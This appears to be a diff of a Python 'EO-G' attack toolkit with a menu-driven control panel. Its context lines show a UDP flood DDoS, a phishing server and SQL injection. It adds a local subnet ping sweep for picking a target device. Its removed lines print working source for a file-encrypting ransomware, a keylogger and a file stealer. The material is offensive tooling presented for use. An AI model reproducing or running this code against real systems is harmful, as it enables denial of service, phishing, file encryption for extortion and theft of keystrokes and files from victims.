@@ -3,6 +3,8 @@ import socket
 import random
 import subprocess
 from http.server import SimpleHTTPRequestHandler, HTTPServer
+import requests  # For SQL Injection functionality
+
 
 # Display Banner
 def display_banner():
@@ -17,10 +19,12 @@ def display_banner():
     """
     print(banner)
 
+
 try:
     display_banner()
 except Exception as e:
     print(f"Error displaying banner: {e}")
+
 
 # EO-G Real System
 class EOGReal:
@@ -29,7 +33,7 @@ class EOGReal:
 
     def recon_target(self, target_ip):
         """
-        Perform actual reconnaissance by pinging the target.
+        Perform reconnaissance by pinging the target.
         """
         print(f"Reconnaissance initiated on target: {target_ip}")
         try:
@@ -44,7 +48,7 @@ class EOGReal:
 
     def ddos_attack(self, target_ip, duration=10):
         """
-        Perform a real UDP flood attack.
+        Perform a UDP flood attack.
         """
         print(f"Starting DDoS attack on {target_ip} for {duration} seconds...")
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -60,7 +64,7 @@ class EOGReal:
 
     def phishing_page(self, port=8080):
         """
-        Set up a real phishing server.
+        Set up a phishing server.
         """
         print(f"Starting phishing server on port {port}")
         phishing_html = """
@@ -87,6 +91,39 @@ class EOGReal:
             print("\nPhishing server stopped.")
             server.server_close()
 
+    def detect_nearby_devices(self):
+        """
+        Detect nearby devices on the network using ARP ping.
+        """
+        print("Scanning for nearby devices...")
+        try:
+            local_ip = socket.gethostbyname(socket.gethostname())
+            subnet = ".".join(local_ip.split(".")[:-1]) + "."
+            print(f"Scanning subnet: {subnet}0/24")
+
+            devices = []
+            for i in range(1, 255):
+                ip = f"{subnet}{i}"
+                result = subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if "1 packets transmitted, 1 received" in result.stdout.decode():
+                    devices.append(ip)
+
+            if not devices:
+                print("No devices found on the network.")
+                return None
+
+            print("\nNearby Devices:")
+            for index, device in enumerate(devices, start=1):
+                print(f"{index}. IP: {device}")
+
+            choice = int(input("Select a device to target (by number): "))
+            selected_device = devices[choice - 1]
+            print(f"Selected Device - IP: {selected_device}")
+            return selected_device
+        except Exception as e:
+            print(f"Error during device detection: {e}")
+            return None
+
     def sql_injection_attack(self, target_url):
         """
         Perform a basic SQL injection attack.
@@ -103,103 +140,6 @@ class EOGReal:
         except Exception as e:
             print(f"Error during SQL injection: {e}")
 
-    def generate_malware(self):
-        """
-        Generate malware based on user input.
-        """
-        print("Malware Generation Menu:")
-        print("1. Ransomware")
-        print("2. Keylogger")
-        print("3. File Stealer")
-        print("4. Custom Script")
-        choice = input("Choose the type of malware to generate: ")
-
-        if choice == "1":
-            target_directory = input("Enter the target directory for ransomware (default: /tmp): ") or "/tmp"
-            malware_code = f"""
-import os
-
-# XOR Encryption Key
-key = 0x42
-
-# Target Directory
-target_directory = "{target_directory}"
-
-def encrypt_file(file_path):
-    try:
-        with open(file_path, 'rb') as f:
-            data = f.read()
-        encrypted_data = bytes([b ^ key for b in data])
-        with open(file_path, 'wb') as f:
-            f.write(encrypted_data)
-        print(f"Encrypted: {{file_path}}")
-    except Exception as e:
-        print(f"Error encrypting {{file_path}}: {{e}}")
-
-for root, dirs, files in os.walk(target_directory):
-    for file in files:
-        encrypt_file(os.path.join(root, file))
-"""
-            with open("ransomware.py", "w") as f:
-                f.write(malware_code)
-            print("Ransomware script saved as 'ransomware.py'.")
-
-        elif choice == "2":
-            malware_code = """
-import pynput
-
-def on_press(key):
-    try:
-        with open("keylogs.txt", "a") as f:
-            f.write(str(key) + "\\n")
-    except Exception as e:
-        print(f"Error logging key: {e}")
-
-from pynput.keyboard import Listener
-with Listener(on_press=on_press) as listener:
-    listener.join()
-"""
-            with open("keylogger.py", "w") as f:
-                f.write(malware_code)
-            print("Keylogger script saved as 'keylogger.py'.")
-
-        elif choice == "3":
-            target_directory = input("Enter the directory to steal files from (default: /tmp): ") or "/tmp"
-            malware_code = f"""
-import os
-import shutil
-
-# Target Directory
-target_directory = "{target_directory}"
-
-# Destination to save stolen files
-destination_directory = "/tmp/stolen_files"
-
-if not os.path.exists(destination_directory):
-    os.makedirs(destination_directory)
-
-for root, dirs, files in os.walk(target_directory):
-    for file in files:
-        full_path = os.path.join(root, file)
-        try:
-            shutil.copy(full_path, destination_directory)
-            print(f"Stolen: {{full_path}}")
-        except Exception as e:
-            print(f"Error stealing file {{full_path}}: {{e}}")
-"""
-            with open("file_stealer.py", "w") as f:
-                f.write(malware_code)
-            print("File stealer script saved as 'file_stealer.py'.")
-
-        elif choice == "4":
-            print("Custom Script Editor:")
-            custom_code = input("Enter your custom Python malware code (end with a blank line):\n")
-            with open("custom_malware.py", "w") as f:
-                f.write(custom_code)
-            print("Custom script saved as 'custom_malware.py'.")
-
-        else:
-            print("Invalid choice. Returning to menu.")
 
 # EO-G Control Panel
 def eog_control():
@@ -209,8 +149,8 @@ def eog_control():
         print("1. Recon Target")
         print("2. DDoS Attack")
         print("3. Phishing Server")
-        print("4. SQL Injection Attack")
-        print("5. Generate Malware")
+        print("4. Detect Nearby Devices")
+        print("5. SQL Injection Attack")
         print("6. Exit")
         choice = input("Choose an option: ")
 
@@ -225,15 +165,18 @@ def eog_control():
             port = int(input("Enter the port for the phishing server: "))
             agent.phishing_page(port)
         elif choice == "4":
+            target_ip = agent.detect_nearby_devices()
+            if target_ip:
+                print(f"Targeting device: {target_ip}")
+        elif choice == "5":
             target_url = input("Enter the target URL for SQL injection: ")
             agent.sql_injection_attack(target_url)
-        elif choice == "5":
-            agent.generate_malware()
         elif choice == "6":
             print("Exiting EO-G Toolkit.")
             break
         else:
             print("Invalid choice. Please try again.")
+
 
 # Run EO-G Control
 if __name__ == "__main__":
